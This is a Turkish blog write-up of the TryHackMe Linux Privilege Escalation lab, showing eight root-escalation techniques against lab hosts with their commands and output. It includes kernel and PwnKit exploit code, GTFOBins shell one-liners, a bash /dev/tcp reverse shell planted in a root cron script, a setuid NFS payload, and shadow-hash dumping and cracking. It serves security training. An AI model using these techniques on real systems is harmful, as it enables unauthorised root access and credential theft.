---
title: "Linux Privilege Escalation — TryHackMe Sekiz Farklı Privesc Vektörü Tek Yazıda"
date: 2026-09-20 17:00:00 +0300
categories: [TryHackMe]
tags: [linux, privilege-escalation, kernel-exploit, sudo, gtfobins, suid, capabilities, cron, path-hijacking, nfs, pwnkit, john-the-ripper, tryhackme]
image: /assets/img/posts/linux-privesc.png
---

> TryHackMe · Linux Privilege Escalation · Medium · Post-Exploitation
{: .prompt-info }

Klasik ve kapsamlı bir Linux post-exploitation odası: her task ayrı bir zafiyetli makine veriyor ve tek tek kernel exploit'ten NFS misconfigürasyonuna, sudo/GTFOBins'ten cron job hijack'e kadar sekiz farklı privesc vektörü uygulamalı olarak işleniyor. Son task ise hepsini birleştiren bir "sürpriz zafiyet" challenge'ı.

| Task | Vektör | Hedef |
|---|---|---|
| 3 & 5 | Kernel Exploit | 10.80.166.187 (`wade7363`, Ubuntu 14.04, kernel 3.13.0-24) |
| 6 | Sudo Misconfigürasyonu / GTFOBins | 10.81.154.20 |
| 7 | SUID Binary | 10.82.140.250 |
| 8 | Linux Capabilities | 10.82.157.48 |
| 9 | Cron Job Hijack | 10.81.153.138 |
| 10 | PATH Hijacking | 10.80.163.189 |
| 11 | NFS `no_root_squash` | 10.82.176.67 |
| 12 | Final Challenge (PwnKit) | 10.80.144.172 (CentOS 7) |

**Zincir (özet):** Her task bağımsız — ortak nokta hepsinin `karen:Password1` (son task hariç `leonard:Penny123`) ile başlayan düşük yetkili bir kullanıcıdan root'a çıkması.

## 01 — Kernel Exploit: CVE-2015-1328 (overlayfs)

İlk enumeration klasik üçlü ile başladı:

```console
$ hostname
wade7363
$ uname -a
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64
$ cat /etc/issue
Ubuntu 14.04 LTS
```

2014 tarihli bir kernel — kesinlikle patch'lenmemiş bir açığı olacaktır. İlk aklıma gelen Dirty COW (CVE-2016-5195) oldu, ama bu spesifik kernel aralığı (`3.13.0 < 3.19`, Ubuntu 12.04/14.04/14.10/15.04) tam olarak **overlayfs local privilege escalation (CVE-2015-1328)** ile eşleşiyor.

exploit-db'de bu CVE için üç PoC var; ilk ikisi (`39166.c`, `39230.c`) bu kernel'de mount/namespace hatalarıyla başarısız oldu:

```console
$ ./ofs        # 39166.c
mount failed.. couldn't create suid :(
$ ./ofs2       # 39230.c
Failed to open setgroups
euid: 65534, egid: 65534   # takılı kaldı
```

Kernel aralığını en dar hedefleyen üçüncü PoC (`37292.c`) ise ilk denemede çalıştı:

```console
$ gcc 37292.c -o ofs3
$ ./ofs3
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
```

> **Ders:** Aynı CVE için birden fazla halka açık PoC olabilir ve hepsi aynı derecede güvenilir değildir. exploit-db açıklamasındaki kernel aralığını (`3.13.0 < 3.19`) hedefin `uname -a` çıktısıyla birebir eşleştiren PoC'u seçmek, "mount failed" ile vakit kaybetmekten daha hızlı sonuç verdi.
{: .prompt-tip }

```console
# find / -name flag1.txt 2>/dev/null
/home/matt/flag1.txt
# cat /home/matt/flag1.txt
THM-28392872729920
```

## 02 — Sudo Misconfigürasyonu ve GTFOBins

Yeni bir hedefte `sudo -l` üç NOPASSWD komut gösterdi:

```console
$ sudo -l
User karen may run the following commands on ip-10-81-154-20:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
```

GTFOBins'teki `find` SUID/sudo tekniği doğrudan root shell veriyor:

```console
$ sudo find . -exec /bin/sh -p \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
```

```console
# cat /home/ubuntu/flag2.txt
THM-402028394
# cat /etc/shadow | grep frank
frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1:...
```

Odanın sorduğu bir yan soru da hipotetikti: kullanıcı `nmap` üzerinde sudo hakkına sahip olsaydı nasıl root shell açılırdı? Eski Nmap sürümlerindeki interactive mode ile:

```console
sudo nmap --interactive
nmap> !sh
```

## 03 — SUID Binary: `base64` ile Dosya Okuma

Bu hedefte klasik `nano`/`find` SUID'i yoktu; `find / -perm -04000` çıktısında dikkat çeken satır `/usr/bin/base64` idi — normalde SUID olmaması gereken bir binary'nin SUID bitiyle işaretlenmesi.

Enumerasyon sırasında `/etc/passwd`'de ilginç bir kullanıcı da göze çarptı:

```console
gerryconway:x:1001:1001::/home/gerryconway:/bin/sh
```

**Gerry Conway** — Punisher ve Wolverine'i yaratan ünlü bir çizgi roman yazarı.

GTFOBins'e göre SUID `base64`, root-only dosyaları okumak için kullanılabilir:

```console
$ base64 /etc/shadow | base64 -d
...
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:...
```

`user2`'nin hash'i `john` + rockyou ile saniyeler içinde düştü:

```console
$ john --wordlist=/usr/share/wordlists/rockyou.txt user2.hash
Password1        (user2)
```

Aynı `base64` SUID hilesi, doğrudan `cat` ile "Permission denied" veren flag dosyasını okumak için de işe yaradı:

```console
$ cat /home/ubuntu/flag3.txt
cat: Permission denied
$ base64 /home/ubuntu/flag3.txt | base64 -d
THM-3847834
```

> **Ders:** SUID enumerasyonunda sadece "bilinen" binary'lere (`nano`, `vim`, `find`) değil, normalde hiç SUID olmaması gereken sıradan araçlara (`base64`, `cp`, `mv`) da bakmak gerekir — GTFOBins'te neredeyse hepsinin bir okuma/yazma/shell tekniği var.
{: .prompt-info }

## 04 — Linux Capabilities: `cap_setuid` ile Root

SUID bitini aramak bu hedefte işe yaramadı çünkü zafiyet dosya izinlerinde değil, **capability**'lerdeydi:

```console
$ getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
```

6 binary'de capability set edilmişti; ikisi (`vim` ve onun salt-okunur kopyası `view`) `cap_setuid+ep` taşıyordu — GTFOBins'in vim girişindeki Python entegrasyonuyla doğrudan `setuid(0)` çağrılabiliyor:

```console
$ /home/karen/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
# id
uid=0(root) gid=1001(karen) groups=1001(karen)
# cat /home/ubuntu/flag4.txt
THM-9349843
```

> **Ders:** `cap_setuid+ep` bir SUID bitinden bağımsız çalışır ve `find -perm -4000` ile görünmez — `getcap -r /` her enumerasyon checklist'inde ayrı bir madde olmalı.
{: .prompt-warning }

## 05 — Cron Job Hijacking: Reverse Shell ile Root

`/etc/crontab`'da dört kullanıcı tanımlı cron job vardı, ikisi klasik "silinmiş script, unutulmuş cron" senaryosuydu (`/antivirus.sh`, `antivirus.sh` — dosyalar yoktu):

```console
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py
```

Asıl kazanan `/home/karen/backup.sh` oldu — kendi kullanıcımıza ait, root tarafından dakikada bir çalıştırılan bir script:

```console
$ ls -la /home/karen/backup.sh
-rw-r--r-- 1 karen karen 77 Jun 20  2021 /home/karen/backup.sh
```

İçeriğini reverse shell ile değiştirip execute izni ekledim:

```console
$ echo '#!/bin/bash
bash -i >& /dev/tcp/192.168.129.106/4444 0>&1' > /home/karen/backup.sh
$ chmod +x /home/karen/backup.sh
```

> **Tuzak:** İlk denemede execute izni unutuldu ve `echo >` işlemi dosyanın orijinal `rw-r--r--` iznini korudu — cron, `+x` olmayan bir scripti sessizce atlar, hata da vermez. Bağlantı gelmeyince ilk kontrol edilmesi gereken şey bu.
{: .prompt-warning }

Kali'de listener açık bekletildi, bir dakika içinde root shell düştü:

```console
$ nc -lvnp 4444
connect to [192.168.129.106] from (UNKNOWN) [10.81.153.138] 60566
root@ip-10-81-153-138:~# id
uid=0(root) gid=0(root)
root@ip-10-81-153-138:~# cat /home/ubuntu/flag5.txt
THM-383000283
root@ip-10-81-153-138:~# cat /etc/shadow | grep matt
matt:$6$WHmIjebL7MA7KN9A$...
```

`matt`'in hash'i de `john` ile anında kırıldı: **`123456`**.

## 06 — PATH Hijacking

Yazılabilir klasörleri tararken listede sıradışı bir tane vardı — kendi kullanıcımıza ait olmayan ama yazma izni olan `/home/murdoch`:

```console
$ find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
...
home/murdoch
...
```

Aynı klasörde SUID bir binary duruyordu:

```console
$ find / -perm -4000 2>/dev/null
...
/home/murdoch/test
$ /home/murdoch/test
sh: 1: thm: not found
```

`test`, tam yol vermeden `thm` adlı bir komutu çağırıyor — yani `$PATH`'e göre arıyor. `/tmp` PATH'e eklenip sahte `thm` (bash kopyası) oraya konunca, SUID root ile çalışan `test` bizim sahte binary'mizi çağırdı:

```console
$ export PATH=/tmp:$PATH
$ cp /bin/bash /tmp/thm
$ chmod +x /tmp/thm
$ /home/murdoch/test
root@ip-10-80-163-189:/# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
root@ip-10-80-163-189:/# cat /home/matt/flag6.txt
THM-736628929
```

## 07 — NFS `no_root_squash`

`/etc/exports` üç paylaşımı da `no_root_squash` ile dışa açık gösterdi:

```console
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

`no_root_squash`, NFS istemcisinden gelen root (uid 0) isteklerini `nfsnobody`'ye indirgemez — yani Kali'den **root olarak** bu paylaşıma SUID bir binary bırakabiliriz ve hedefte gerçek root gibi çalışır.

```console
$ sudo mount -o rw,vers=3 10.82.176.67:/home/backup /tmp/nfs
$ cat << 'EOF' > /tmp/nfs.c
#include <unistd.h>
#include <stdlib.h>
int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }
EOF
```

İki tuzağa takıldım sırayla:

1. **Sıradan kullanıcı yazamıyor:** `gcc ... -o /tmp/nfs/nfs` doğrudan mount noktasına yazmaya çalıştığında "Permission denied" verdi — çünkü yazan taraf `gcc`'nin çalıştığı normal Kali kullanıcısıydı, root değil. Çözüm: local'de derleyip `sudo cp` ile **root olarak** mount'a kopyalamak.
2. **Dizin izni eksik:** Kopyalama ve `chmod +xs` sonrası dosya `-rwsr-sr-x` görünüyordu ama hedefte `Permission denied` alındı — `sudo ls -la /tmp/nfs` gerçek izni gösterdi: `drw-r--r--` (dizinde **execute biti yok**). `sudo chmod 755 /tmp/nfs` ile düzeltildi.
3. **GLIBC uyumsuzluğu:** Düzeltmeden sonra bile `GLIBC_2.34 not found` hatası geldi — Kali'nin glibc'si hedeften (Ubuntu 20.04) daha yeniydi. `gcc -static` ile statik derleme sorunu çözdü.

```console
$ gcc -static /tmp/nfs.c -o /tmp/nfs_bin
$ sudo cp /tmp/nfs_bin /tmp/nfs/nfs
$ sudo chmod +xs /tmp/nfs/nfs
```

Hedefte:

```console
$ /home/backup/nfs
root@ip-10-82-176-67:/# id
uid=0(root) gid=0(root)
root@ip-10-82-176-67:/# cat /home/matt/flag7.txt
THM-89384012
```

> **Ders:** NFS `no_root_squash` exploit'i teoride tek komutluk gibi görünse de pratikte üç ayrı katmanda (dosya sahipliği, dizin izinleri, binary uyumluluğu) hata payı var — her adımı `sudo` ile mount noktasından doğrulamak zaman kazandırıyor.
{: .prompt-tip }

## 08 — Final Challenge: PwnKit (CVE-2021-4034)

Son task, öğrenilenleri sınayan bağımsız bir CentOS 7 kutusuydu (`leonard:Penny123`). `sudo -l` kapalıydı, SUID listesi uzundu ama hiçbiri GTFOBins'te doğrudan kazanç vermiyordu — tek dikkat çeken `pkexec`:

```console
$ pkexec --version
pkexec version 0.112
$ cat /etc/os-release
PRETTY_NAME="CentOS Linux 7 (Core)"
```

2021 civarı bir CentOS 7 kutusunda `polkit 0.112` — CVE-2021-4034 ("**PwnKit**") için doğru profil. exploit-db'deki hazır `.c` dosyası (`50689`) aslında bir `.txt` yazı formatındaydı; içinden üç parçayı (`evil-so.c`, `exploit.c`, Makefile mantığı) çıkarıp hedefte derledim:

```c
// evil-so.c
void gconv_init() {
    setuid(0); setgid(0); setgroups(0);
    execve("/bin/sh", NULL, NULL);
}
```

```c
// exploit.c — pkexec'i bozuk GCONV_PATH ortam değişkeniyle çağırıyor
execve("/usr/bin/pkexec", (char*[]){ NULL },
       (char*[]){ "evildir", "PATH=GCONV_PATH=.", "SHELL=x", "CHARSET=x", NULL });
```

```console
$ gcc -shared -o evil.so -fPIC evil-so.c
$ gcc exploit.c -o exploit
$ ./exploit
[root@ip-10-80-144-172 tmp]# id
uid=0(root) gid=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

```console
[root@ip-10-80-144-172 tmp]# find / -iname "flag*.txt" 2>/dev/null
/home/missy/Documents/flag1.txt
/home/rootflag/flag2.txt
[root@ip-10-80-144-172 tmp]# cat /home/missy/Documents/flag1.txt
THM-42828719920544
[root@ip-10-80-144-172 tmp]# cat /home/rootflag/flag2.txt
THM-168824782390238
```

> ✅ Sekiz farklı hedefte, sekiz farklı vektörle root: kernel exploit, sudo/GTFOBins, SUID, capabilities, cron hijack, PATH hijack, NFS `no_root_squash`, PwnKit.
{: .prompt-tip }

## Özet — Bu odada öğrenilen teknikler

- **Kernel exploit seçerken** exploit-db açıklamasındaki kernel aralığını `uname -a` ile birebir eşleştirmek, rastgele PoC deneyip "mount failed" ile vakit kaybetmekten çok daha hızlı.
- **`sudo -l`** her zaman ilk adım olmalı — GTFOBins, çıkan her binary için hazır bir tekniğe sahip.
- **SUID enumerasyonu** sadece "meşhur" binary'lerle (`nano`, `vim`) sınırlı kalmamalı; `base64`, `cp` gibi normalde SUID olmayan araçlar da kontrol listesine girmeli.
- **`getcap -r /`**, SUID taramasının kör noktası olan capability tabanlı privesc'i (`cap_setuid+ep`) yakalamanın tek yolu.
- **Cron job hijack**'te dosyayı düzenlemek yetmez — `chmod +x` unutulursa cron sessizce atlar, hata da vermez.
- **PATH hijack**'i bulmak için SUID/sudo edilebilen bir binary'nin tam yol vermeden çağırdığı komutları (`strace`/hata mesajları) izlemek yeterli.
- **NFS `no_root_squash`**'ta üç ayrı hata katmanı var: dosyayı root olarak yazmak (`sudo cp`), dizin izinlerini kontrol etmek (`sudo ls -la` mount noktasından), ve hedef/saldırgan glibc uyumsuzluğu için statik derlemek.
- **PwnKit (CVE-2021-4034)**, `pkexec --version` + `/etc/os-release` ile birkaç saniyede teşhis edilebilecek kadar yaygın ve hâlâ karşılaşılan bir zafiyet — exploit-db'deki PoC her zaman hazır `.c` dosyası olarak gelmeyebilir, yazıdan koda dönüştürmek gerekebilir.

---

Kişisel TryHackMe lab notu — Linux Privilege Escalation, eğitim/lab ortamı.
